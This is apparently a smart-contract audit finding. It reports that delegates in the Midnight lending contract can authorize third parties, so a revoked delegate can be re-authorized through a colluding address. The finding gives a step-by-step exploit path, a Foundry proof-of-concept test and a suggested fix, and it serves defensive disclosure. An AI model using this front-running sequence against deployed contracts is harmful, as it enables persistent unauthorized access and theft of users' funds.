### Title
Authorized User Can Front-Run Deauthorization by Granting Authorization to a Third Party - (File: src/Midnight.sol)

### Summary

`Midnight.setIsAuthorized()` permits any currently-authorized address to grant or revoke authorizations on behalf of the original user. A malicious authorized user who detects a pending deauthorization transaction can front-run it by authorizing a colluding address, then use that address to re-authorize themselves after being removed. This creates an irrevocable authorization loop that can result in permanent loss of user funds.

### Finding Description

`Midnight.setIsAuthorized()` uses the pattern:

```solidity
// src/Midnight.sol lines 731-735
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
``` [1](#0-0) 

The authorization check `isAuthorized[onBehalf][msg.sender]` means any currently-authorized address can call this function with `onBehalf = victim`, granting or revoking authorizations for the victim's account. The protocol's own NatSpec explicitly acknowledges this:

> "authorized accounts can authorize other accounts on behalf of the user" [2](#0-1) 

The existing test `testSetIsAuthorizedAuthorization` in `test/AuthorizationTest.sol` confirms this is working-as-designed — an authorized address successfully calls `setIsAuthorized(newAuthorized, true, user)`: [3](#0-2) 

**Exploit path:**

1. Alice authorizes Bob: `setIsAuthorized(bob, true, alice)` (called by Alice).
2. Bob turns malicious. Alice submits `setIsAuthorized(bob, false, alice)` to the mempool.
3. Bob observes Alice's pending transaction and front-runs it by calling `setIsAuthorized(eve, true, alice)` (valid because Bob is still authorized at this point).
4. Alice's transaction executes — Bob is now deauthorized.
5. Eve (now authorized) calls `setIsAuthorized(bob, true, alice)` — Bob is re-authorized.
6. Bob can now call `withdraw()`, `withdrawCollateral()`, `repay()`, `setConsumed()`, or `take()` on behalf of Alice indefinitely.

The same attack vector also exists in `EcrecoverAuthorizer.setIsAuthorized()`, which accepts a signature from any address that `isAuthorized(authorization.authorizer, signer)` returns true for: [4](#0-3) 

### Impact Explanation

An authorized-turned-malicious user can permanently maintain access to a victim's account by cycling through colluding addresses. With persistent authorization, the attacker can:

- Call `withdraw()` to drain the victim's credit (loan tokens).
- Call `withdrawCollateral()` to steal the victim's collateral.
- Call `take()` to open unbounded debt positions on the victim's behalf.
- Call `setConsumed()` to cancel the victim's active offers.

This constitutes direct, irreversible theft of user funds. The victim cannot reliably revoke access because every deauthorization attempt can be front-run.

### Likelihood Explanation

- **Precondition:** Alice must have previously authorized Bob — a normal, intended user action.
- **Attacker capability:** Bob only needs to monitor the public mempool (standard on Ethereum mainnet) and submit a transaction with a higher gas price.
- **No privileged access required:** Bob is a regular user-level authorized address, not an admin or governance key.
- **Persistence:** Bob can maintain the loop indefinitely by pre-authorizing multiple colluding addresses, making a single `setIsAuthorized(bob, false, alice)` insufficient to stop the attack.

### Recommendation

Restrict `setIsAuthorized` so that only the account itself (`msg.sender == onBehalf`) can grant new authorizations. Authorized addresses should only be permitted to *revoke* authorizations (i.e., set `newIsAuthorized = false`) on behalf of the user, not grant new ones. Alternatively, add a dedicated `authorizeWithSig()` function that accepts a signature directly from the account owner, keeping the signing path separate from the delegation path.

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(
        onBehalf == msg.sender ||
        (isAuthorized[onBehalf][msg.sender] && !newIsAuthorized), // authorized can only revoke
        Unauthorized()
    );
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

### Proof of Concept

```solidity
// Foundry test demonstrating the front-run loop
function testFrontRunDeauthorization() public {
    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");
    address eve   = makeAddr("eve");

    // Step 1: Alice authorizes Bob
    vm.prank(alice);
    midnight.setIsAuthorized(bob, true, alice);
    assertTrue(midnight.isAuthorized(alice, bob));

    // Step 2: Bob (malicious) front-runs Alice's pending deauthorization
    //         by authorizing Eve while he is still authorized
    vm.prank(bob);
    midnight.setIsAuthorized(eve, true, alice);
    assertTrue(midnight.isAuthorized(alice, eve));

    // Step 3: Alice's deauthorization of Bob executes
    vm.prank(alice);
    midnight.setIsAuthorized(bob, false, alice);
    assertFalse(midnight.isAuthorized(alice, bob));

    // Step 4: Eve re-authorizes Bob — Alice's revocation is defeated
    vm.prank(eve);
    midnight.setIsAuthorized(bob, true, alice);
    assertTrue(midnight.isAuthorized(alice, bob)); // Bob is back

    // Step 5: Bob can now drain Alice's funds
    // e.g., midnight.withdraw(market, aliceCredit, alice, bob) — succeeds
}
``` [1](#0-0) [5](#0-4) [6](#0-5)

### Citations

**File:** src/Midnight.sol (L101-109)
```text
/// AUTHORIZATIONS
/// @dev All functions that change the position, consumed and authorization are accessible to the user and to
/// any account that has been authorized. Thus, to scope authorizations one should authorize a smart-contract with
/// scoped behavior.
/// @dev When authorizing a smart-contract, one should consider:
/// - The targets/functions that the account can call. At least Midnight's functions should be considered, but other
/// contracts might re-use Midnight's authorization mapping too (e.g ratifiers and authorizers). In particular,
/// authorized accounts can authorize other accounts on behalf of the user.
/// - Under which conditions the account can return CALLBACK_SUCCESS when its isRatified function is called.
```

**File:** src/Midnight.sol (L481-483)
```text
    function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
```

**File:** src/Midnight.sol (L555-557)
```text
    ) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```
